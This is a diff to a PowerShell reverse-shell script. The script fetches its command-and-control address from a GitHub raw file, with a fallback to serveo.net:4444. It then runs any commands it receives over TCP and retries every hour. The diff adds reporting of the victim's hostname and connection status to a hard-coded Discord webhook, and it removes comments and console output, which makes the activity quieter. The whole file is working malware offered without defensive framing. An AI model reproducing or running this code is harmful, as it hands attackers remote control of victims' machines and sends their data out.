@@ -1,12 +1,31 @@
+# Set your Discord webhook URL here
+$DiscordWebhookUrl = "https://discord.com/api/webhooks/1296452384255643659/ITVRqYmNTGa9EtgeAQBV8jEHq96aq9-RlbZa_VAGBmVALFxQqR6cYRuIuCOqNDTL-XHp"
+
+function Send-DiscordMessage {
+    param (
+        [string]$message
+    )
+
+    try {
+        $payload = @{
+            content = $message
+        } | ConvertTo-Json
+
+        Invoke-RestMethod -Uri $DiscordWebhookUrl -Method Post -Body $payload -ContentType 'application/json'
+    } catch {
+        # If sending the message fails, just catch the error to prevent script termination
+        Write-Host "Failed to send message. Error: $_"
+    }
+}
+
 function Get-DynamicServeoAddress {
     $githubUrl = "https://raw.githubusercontent.com/nkt420/winstf/main/hip.txt"
     try {
-        # Get the Serveo address (e.g., serveo.net:4444) from the remote file
         $serveoAddress = Invoke-RestMethod -Uri $githubUrl -UseBasicParsing
+        Send-DiscordMessage "Retrieved Serveo Address: $serveoAddress"
         return $serveoAddress
     } catch {
-        # Fallback to a default Serveo address if the request fails
-        Write-Host "Failed to retrieve Serveo address. Using fallback."
+        Send-DiscordMessage "Failed to retrieve Serveo address. Using fallback."
         return "serveo.net:4444"
     }
 }
@@ -17,12 +36,10 @@ function Start-ReverseShell {
     )
 
     try {
-        # Split the Serveo address into IP (or domain) and port
         $addressParts = $serveoAddress -split ':'
         $ipAddress = $addressParts[0]
         $port = [int]$addressParts[1]
 
-        # Establish a TCP connection to Serveo
         $client = New-Object System.Net.Sockets.TCPClient
         $client.Connect($ipAddress, $port)
 
@@ -33,6 +50,7 @@ function Start-ReverseShell {
             $buffer = New-Object System.Byte[] 1024
             $hostname = [System.Net.Dns]::GetHostName()
             $writer.WriteLine("Connected from $hostname")
+            Send-DiscordMessage "Connected to $serveoAddress from $hostname"
 
             while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
                 $data = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead).Trim()
@@ -48,6 +66,7 @@ function Start-ReverseShell {
                     }
                 } catch {
                     $writer.WriteLine("Error executing command: $_")
+                    Send-DiscordMessage "Error executing command: $_"
                 }
             }
             $client.Close()
@@ -55,38 +74,36 @@ function Start-ReverseShell {
             throw "Connection failed to $ipAddress:$port"
         }
     } catch {
-        Write-Host "Failed to connect to $serveoAddress. Error: $_"
+        Send-DiscordMessage "Failed to connect to $serveoAddress. Error: $_"
     }
 }
 
 function Main {
     while ($true) {
         try {
-            # Retrieve the Serveo address dynamically
             $serveoAddress = Get-DynamicServeoAddress
-            Write-Host "Retrieved Serveo Address: $serveoAddress"
             $connected = $false
             $retryAttempts = 5
 
             for ($i = 1; $i -le $retryAttempts; $i++) {
-                Write-Host "Attempting connection (Attempt $i/$retryAttempts)..."
+                Send-DiscordMessage "Attempting connection to $serveoAddress (Attempt $i/$retryAttempts)..."
                 Start-ReverseShell -serveoAddress $serveoAddress
 
                 if ($client.Connected) {
                     $connected = $true
                     break
                 } else {
-                    Write-Host "Connection failed. Retrying in 30 seconds..."
+                    Send-DiscordMessage "Connection failed. Retrying in 30 seconds..."
                     Start-Sleep -Seconds 30
                 }
             }
 
             if (-not $connected) {
-                Write-Host "Unable to connect after $retryAttempts attempts."
+                Send-DiscordMessage "Unable to connect to $serveoAddress after $retryAttempts attempts."
             }
 
         } catch {
-            Write-Host "Error in Main loop: $_"
+            Send-DiscordMessage "Error in Main loop: $_"
         }
 
         Start-Sleep -Seconds 3600
